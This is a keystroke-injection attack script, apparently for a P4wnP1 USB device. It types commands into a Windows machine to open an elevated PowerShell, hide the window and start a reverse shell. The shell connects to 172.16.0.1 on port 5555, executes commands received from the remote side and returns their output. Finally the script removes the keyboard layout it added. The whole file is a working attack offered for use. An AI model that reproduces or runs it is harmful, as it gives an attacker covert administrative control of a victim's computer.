layout('it');			// US keyboard layout

typingSpeed(0,0)
press("GUI r")			// win + r
delay(400)				
type("powershell")			// powershell.exe
press("CTRL SHIFT ENTER")	// run as administrator
delay(1500)			
press("LEFT")		
press("ENTER")			
delay(3000)

type("$LanguageList = Get-WinUserLanguageList\n") 
type("$LanguageList\n")
type("$LanguageList.Add('en-US')\n") //download the US keyboard
layout('us');
press("GUI Space")

type("PowerShell.exe -windowstyle hidden { \n") // hide windows powershell

type("$client = [System.Net.Sockets.TCPClient]::new('172.16.0.1', 5555)\n") // IP lan P4wnP1 : 172.16.0.1 ; PORT used : 5555
type("[byte[]]$bytes = (0..65535).ForEach{ 0 }\n")

type("$stream = $client.GetStream()\n")
type("while ($i = $stream.Read($bytes, 0, $bytes.Length)) {\n")
type("    $data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i)\n")
type("    $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String)\n")
type("    $prompt = $sendback + 'PS ' + $PWD.Path + '> '\n")
type("    $sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($prompt)\n")
type("    $stream.Write($sendbyte, 0, $sendbyte.Length)\n")
type("    $stream.Flush()\n")
type("}\n")
type("$client.Close()\n")
type("}\n")
type("$LanguageList.Remove('en-US')") //remove the new keyboard
